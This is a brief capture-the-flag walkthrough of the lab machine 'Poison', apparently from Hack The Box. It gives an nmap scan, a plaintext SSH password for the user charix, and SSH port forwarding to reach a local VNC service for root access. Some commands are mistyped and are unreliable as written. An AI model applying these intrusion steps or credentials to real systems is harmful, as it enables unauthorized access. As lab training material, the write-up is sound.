Poison without metasploit

![Poison](https://user-images.githubusercontent.com/55708909/91841738-7adcbb80-ec70-11ea-9770-71c82f4ee83a.png)

Starting with nmap scan:

Nmap -sC -sV -T4 -A -O -oA Poison -p- 10.10.10.84

This is the first thing that i saw as i proceeded further i was able to get the charix credentials

![Poison_port_80](https://user-images.githubusercontent.com/55708909/91856007-9604f680-ec83-11ea-9f38-4da1a423dab1.png)

![Poison_part_1](https://user-images.githubusercontent.com/55708909/91856026-9d2c0480-ec83-11ea-8ae0-1c4f28344100.png)

![Poison_part_2](https://user-images.githubusercontent.com/55708909/91856019-9b624100-ec83-11ea-9f67-830e8606dbf9.png)

ssh charix@10.10.10.84 pssword: Charix!2#4%6&8(0

After ssh into box you look at secret.zip file in try to open but anyways i transfer to my pc

After enumerate through system i file vnc service running at port 5901 this means we have to do local port forwarding and 
then use that secret file to enter into vnc service 

grep -aux |grep vnc
netstat -an |grep LIST
ssh -L 5001:127.0.0.1:5901 charix@10.10.10.84
after that at your system run these command vncviewer 127.0.0.5001 -passwd secret and you have root access.

![Poison_root_1](https://user-images.githubusercontent.com/55708909/91860340-2c87e680-ec89-11ea-9c81-a310a25b2b22.png)

![Poison_root_2](https://user-images.githubusercontent.com/55708909/91860334-2abe2300-ec89-11ea-822c-13d9eede4318.png)

![Poison_root_3](https://user-images.githubusercontent.com/55708909/91860328-298cf600-ec89-11ea-9174-98c875f8718d.png)
